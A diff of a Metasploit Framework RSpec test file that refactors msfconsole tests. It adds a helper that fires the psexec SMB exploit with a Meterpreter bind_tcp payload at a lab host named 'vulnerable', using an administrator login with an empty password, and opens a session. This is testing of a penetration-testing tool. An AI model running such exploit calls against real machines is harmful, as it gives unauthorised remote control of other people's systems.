@@ -3,133 +3,100 @@ $:.unshift(File.join(File.dirname(__FILE__), '..', '..', 'lib'))
 $:.unshift(File.join(File.dirname(__FILE__), '..', '..', '..', 'lib'))
 $:.unshift(File.join(File.dirname(__FILE__), '..', '..', '..', 'test', 'lib'))
 
-
 require 'fileutils'
+require 'msf/base'
 require 'msf_matchers'
-require 'singleton'
-require 'nokogiri'
-
-#Spec::Runner.configure do |config|  
-#  config.include(MsfMatchers)  
-#end
+require 'msf_test_case'
 
 
 module MsfTest
 
 include MsfTest::MsfMatchers
 
-class MsfTestCase
-	
-	attr_accessor :verbose, :name, :description
-	attr_accessor :commands, :expected_successes,  :expected_failures
-	attr_accessor :expected_failure_exceptions
-	
-	def initialize(filename,verbose=nil)
-		@filename = filename
-		@verbose = verbose || false
-		@name = ""
-		@description = ""
-		@commands = ""
-		@expected_successes = []
-		@expected_failures  = []
-		@expected_failure_exceptions = []
-		parse
-	end
 
-	def parse
-		
-		if @verbose
-			puts "Parsing: #{@filename}"
-		end
-		
-		input = Nokogiri::XML(File.new(@filename))
-
-		@name = input.root.xpath("//name").text.strip
-		
-		##
-		## Get commands
-		##
-		@commands = input.root.xpath("//commands").children.to_s.gsub("\t","")
-
-		##
-		## Get successes
-		##
-		@expected_successes = input.root.xpath("//success").collect(&:text)
-		@expected_successes.each { |item| item.strip!}
-		
-		## 
-		## Get failures
-		## 
-		@expected_failures = input.root.xpath("//failure").collect(&:text)
-		@expected_failures.each { |item| item.strip!}
-			
-		## 
-		## Get failure exceptions
-		## 
-		@expected_failure_exceptions = input.root.xpath("//failure_exceptions").collect(&:text)
-		@expected_failure_exceptions.each { |item| item.strip!}
-	end
-end
-
-
-
+## This spec exists to help us describe the behavior of msfconsole - TODO
 
 describe "Msfconsole" do
 	
 	###
-	### Setup!
+	# Setup!
 	###
 	
 	before :all do
 		
-		## This needs to be here for the actual test cases (and helpers)
-		## Note that the actual setup happens pre-rspec (see below)
 		@working_directory = File.dirname(__FILE__)
-		@temp_directory = "#{@working_directory}/msfconsole_spec_working"
+
+		## Static specs will make use of RC files here
+		@static_resource_directory = "#{@working_directory}/msftest/resource"
+
+		## Directories for the generated specs
+		@temp_directory = "#{@working_directory}/msfconsole_specs"
+		@temp_input_directory = "#{@temp_directory}/generated_rc"
+
+		## Where all output from the runs will go
 		@temp_output_directory = "#{@temp_directory}/output"
-		@temp_input_directory = "#{@temp_directory}/input"
-		@default_file = "#{@temp_output_directory}/default"
+
+		## Create a framework object
+		@framework = ::Msf::Simple::Framework.create
 	end
 
 	before :each do
-
 	end
 
 	after :each do
+	
 	end
 
 	after :all do
-		## CLEANUP THE WORKING DIRECTORY	
+		## Clean up
 		#FileUtils.rm_rf(@temp_directory)
 	end
 
 	###
-	### Static Test cases!
+	# Static Test cases!
 	###
+
 	it "should start and let us run help" do
+			data = start_console_and_run_rc("help","#{@static_resource_directory}/help.rc")
+			
 			success_strings = [	'help',
 						'Database Backend Commands',
 						'Core Commands' ]
-				
 			failure_strings = [] | generic_failure_strings
 			failure_exception_strings = [] | generic_failure_exception_strings
 
-			data = hlp_run_command_check_output("help","#{@working_directory}/msftest/resource/help.rc")
-			
 			data.should contain_all_successes(success_strings)
 			data.should contain_no_failures_except(failure_strings, failure_exception_strings)
 	end
 
+	it "should generate a meterpreter session against a vulnerable win32 host" do
+		## Set input & output to something sane
+		input        = Rex::Ui::Text::Input::Stdio.new
+		output       = Rex::Ui::Text::Output::File.new("temp.output")
+		session = generate_x86_meterpreter_session(input, output)
+
+		session.should_not be_nil	
+	
+		if session
+			session.load_stdapi
+			session.run_cmd("help")
+		else
+			flunk "Error interacting with session"
+		end
+	end
+	
 	###
-	### Dynamic Test Cases!!
+	# Dynamic Test Cases!!
 	###
 
-	## PRE_TEST WORKING DIR SETUP`
 	@working_directory = File.dirname(__FILE__)
-	@temp_directory = "#{@working_directory}/msfconsole_spec_working"
+
+	## Directories for the generated specs
+	@temp_directory = "#{@working_directory}/msfconsole_specs"
+	@temp_input_directory = "#{@temp_directory}/generated_rc"
+
+	## Where all output from the runs will go
 	@temp_output_directory = "#{@temp_directory}/output"
-	@temp_input_directory = "#{@temp_directory}/input"
-	@default_file = "#{@temp_output_directory}/default"
 
 	if File.directory? @temp_directory
 		FileUtils.rm_rf(@temp_directory)
@@ -138,8 +105,7 @@ describe "Msfconsole" do
 	Dir.mkdir(@temp_directory)
 	Dir.mkdir(@temp_input_directory)
 	Dir.mkdir(@temp_output_directory)
-	## END PRE_TEST WORKING DIR SETUP
-
+	
 	Dir.glob("#{@working_directory}/msftest/*.msftest").each do |filename|
 		
 		## Parse this test case
@@ -159,7 +125,7 @@ describe "Msfconsole" do
 			failure_exception_strings = test_case.expected_failure_exceptions | generic_failure_exception_strings
 			
 			## run the commands
-			data = hlp_run_command_check_output( test_case.name, "#{@temp_input_directory}/#{test_case.name}.rc")	
+			data = start_console_and_run_rc( test_case.name, "#{@temp_input_directory}/#{test_case.name}.rc")	
 					
 			## check the output		
 			data.should contain_all_successes(success_strings)
@@ -171,10 +137,8 @@ describe "Msfconsole" do
 		end
 	end
 
-
-
 	###
-	### Test case helpers:
+	# Test case helpers:
 	###
 	def generic_success_strings
 		[]	
@@ -188,30 +152,53 @@ describe "Msfconsole" do
 		[]
 	end
 
-	def hlp_do_test_setup
-
-	end
-
-	def hlp_run_command_check_output(name,rc_file, database_file=false)
-
-		temp_output_file = "#{@temp_output_directory}/#{name}"
+	def start_console_and_run_rc(name,rc_file, database_file=false)
+		output_file = "#{@temp_output_directory}/#{name}"
 
 		if database_file
-			msfconsole_string = "ruby #{@working_directory}/../../../msfconsole -o #{temp_output_file} -r #{rc_file} -y #{database_file}"
+			msfconsole_string = "ruby #{@working_directory}/../../../msfconsole -o #{output_file} -r #{rc_file} -y #{database_file}"
 		else
-			msfconsole_string = "ruby #{@working_directory}/../../../msfconsole -o #{temp_output_file} -r #{rc_file}"
+			msfconsole_string = "ruby #{@working_directory}/../../../msfconsole -o #{output_file} -r #{rc_file}"
 		end
-
-		puts "\n\nName: #{name}"
-		puts "RC File: #{rc_file}"
-		puts "Output File: #{temp_output_file}"	
-		puts "System Command: #{msfconsole_string}"	
 		
 		system("#{msfconsole_string}")
-		data = hlp_file_to_string("#{temp_output_file}")			
+
+		data = hlp_file_to_string("#{output_file}")			
 	end
   
-  	
+  	def generate_x86_meterpreter_session(input, output)
+		## Setup for win32
+		exploit_name = 'windows/smb/psexec'
+		payload_name = 'windows/meterpreter/bind_tcp'
+			
+		## Fire it off against a known-vulnerable host
+		session = @framework.exploits.create(exploit_name).exploit_simple(
+			'Options'     => {'RHOST' => "vulnerable", "SMBUser" => "administrator", "SMBPass" => ""},
+			'Payload'     => payload_name,
+			'LocalInput'  => input,
+			'LocalOutput' => output)
+
+		## If a session came back, try to interact with it.
+		if session
+			return session
+		else
+			return nil
+		end
+	end
+
+  	def generate_win64_meterpreter_session(input, output)
+		raise "Not Implemented"
+	end
+
+
+  	def generate_java_meterpreter_session(input, output)
+		raise "Not Implemented"
+	end
+ 
+   	def generate_php_meterpreter_session(input, output)
+		raise "Not Implemented"
+	end
+
 	def hlp_file_to_string(filename)
 		data = ""
 		f = File.open(filename, "r") 
